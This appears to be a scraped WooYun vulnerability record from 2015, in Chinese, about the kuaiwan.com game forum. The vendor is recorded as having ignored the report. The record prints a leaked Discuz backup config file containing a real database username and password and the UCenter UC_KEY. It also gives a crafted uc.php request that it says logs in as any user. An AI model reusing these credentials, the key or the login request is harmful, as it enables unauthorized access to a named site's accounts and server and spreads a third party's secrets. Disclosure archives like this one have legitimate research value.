{"id": 44537, "wybug_id": "wooyun-2015-0108444", "wybug_title": "快玩游戏某处漏洞导致敏感信息泄露可登陆任意用户及Getshell（24万）", "wybug_corp": "kuaiwan.com", "wybug_author": "路人甲", "wybug_date": "2015-04-17 09:34", "wybug_open_date": "2015-04-22 09:36", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 快玩游戏某处漏洞导致敏感信息泄露可登陆任意用户及getshell（24万） 详细说明：  http://bbs.web.kuaiwan.com/config.inc.php~\n<?php/*\t[Discuz!] (C)2001-2006 Comsenz Inc.\tThis is NOT a freeware, use is subject to license terms\t$RCSfile: config5.inc.php,v $\t$Revision: 1.9 $\t$Date: 2007/01/26 01:11:32 $*/// [CH] 以下变量请根据空间商提供的账号参数修改,如有疑问,请联系服务器提供商\t$dbhost = 'localhost';\t\t\t// 数据库服务器\t$dbuser = 'webkwbbs';\t\t\t// 数据库用户名\t$dbpw = 'kwbbspwd2011';\t\t\t\t// 数据库密码\t$dbname = 'webkw_bbs';\t\t\t// 数据库名\t$pconnect = 0;\t\t\t\t// 数据库持久连接 0=关闭, 1=打开// [CH] Mysql 辅助服务器设置，只有当您拥有多个 Mysql 服务器且协同工作时请进行设置\t$multiserver = array();\t\t\t// 服务器变量初始化，请勿修改或删除\t// [CH] 如您对 cookie 作用范围有特殊要求, 或论坛登录不正常, 请修改下面变量, 否则请保持默认\t$cookiepre = 'KW_';\t\t\t// cookie 前缀\t$cookiedomain = 'bbs.web.kuaiwan.com'; \t\t\t// cookie 作用域\t$cookiepath = '/';\t\t\t// cookie 作用路径// [CH] 论坛投入使用后不能修改的变量\t$tablepre = 't_';   \t\t\t// 表名前缀, 同一数据库安装多个论坛请修改此处// [CH] 小心修改以下变量, 否则可能导致论坛无法正常使用\t$database = 'mysql';\t\t\t// 论坛数据库类型，请勿修改\t$dbcharset = '';\t\t\t// MySQL 字符集, 可选 'gbk', 'big5', 'utf8', 'latin1', 留空为按照论坛字符集设定\t$charset = 'utf-8';\t\t\t// 论坛页面默认字符集, 可选 'gbk', 'big5', 'utf-8'\t$headercharset = 0;\t\t\t// 强制论坛页面使用默认字符集，可避免部分服务器空间页面出现乱码，一般无需开启。 0=关闭 1= 开启\t$tplrefresh = 1;\t\t\t// 论坛风格模板自动刷新开关 0=关闭, 1=打开。// [CH] 论坛安全设置, 调整以下设置，可以增强论坛的安全性能和防御性能\t$adminemail = 'service@kuaiwan.com';\t\t// 系统管理员 Email\t$forumfounders = '1,20038';\t\t\t// 论坛创始人 UID, 可以支持多个创始人，之间使用 “,” 分隔。[出于安全考虑，请务必设置一名管理员为创始人]\t\t\t\t\t\t// 论坛创始人可对其他管理员进行设置。如果不设置论坛创始人，则论坛管理员之间权利平等。\t$dbreport = 0;\t\t\t\t// 论坛出现数据库错误时，是否通过 email 发送错误报告给系统管理员\t$errorreport = 1;\t\t\t// 是否屏蔽程序错误信息, 0=屏蔽所有错误(安全) 1=报告给管理员和版主(安全) 2=报告给任何人\t$attackevasive = 0;\t\t\t// 论坛防御级别，可防止大量的非正常请求造成的拒绝服务攻击\t\t\t\t\t\t// 防护大量非正常请求造成的拒绝服务攻击,\t\t\t\t\t\t// 0=关闭, 1=cookie 刷新限制, 2=限制代理访问, 4=二次请求, 8=回答问题（第一次访问时需要回答问题）\t\t\t\t\t\t// 组合为: 1|2, 1|4, 2|8, 1|2|4...\t\t$urlxssdefend = 1;\t\t\t// 论坛访问页面防御开关，可避免用户通过非法的url地址对本站用户造成危害，建议打开。1=打开 0关闭\t$admincp = array();\t$admincp['forcesecques'] = 0;\t\t// 管理人员必须设置安全提问才能进入系统设置, 0=否, 1=是[安全]\t$admincp['checkip'] = 0;\t\t// 后台管理操作是否验证管理员的 IP, 1=是[安全], 0=否。仅在管理员无法登陆后台时设置 0。\t$admincp['tpledit'] = 0;\t\t// 是否允许在线编辑论坛模板 1=是 0=否[安全]\t$admincp['runquery'] = 1;\t\t// 是否允许后台运行 SQL 语句 1=是 0=否[安全]\t$admincp['dbimport'] = 1;\t\t// 是否允许后台恢复论坛数据  1=是 0=否[安全]// ============================================================================define('UC_CONNECT', 'mysql');define('UC_DBHOST', 'localhost');define('UC_DBUSER', 'webkwbbs');define('UC_DBPW', 'kwbbspwd2011');define('UC_DBNAME', 'webkw_bbs');define('UC_DBCHARSET', 'utf8');define('UC_DBTABLEPRE', '`webkw_bbs`.t_uc_');define('UC_DBCONNECT', '0');define('UC_KEY', 'B0abq9MfgdDckcke58T1X2k1bfh8Xa8bY1S2Ydtbfbp5011480Uad26bT998dfl6');define('UC_API', 'http://bbs.web.kuaiwan.com/uc_server');define('UC_CHARSET', 'utf-8');define('UC_IP', '');define('UC_APPID', '1');define('UC_PPP', '20');\nuc_key泄漏 可登陆任意用户：\nhttp://bbs.kuaiwan.com/api/uc.php?code=8f18I3pPFPT%2BAXmYHo4q1ajyDovcor9jBs5ceVWAsCU28lOeBE%2FyP6Svz4jgpoLq3lIGes1IfDhhc2cEumWIi9lYEgaZg3RmZPE%2B8iPuywm%2B\n   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-22 09:36 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-22 16:06 |    \t\tNAT \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        )\t\t \n  vim的锅hhh    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}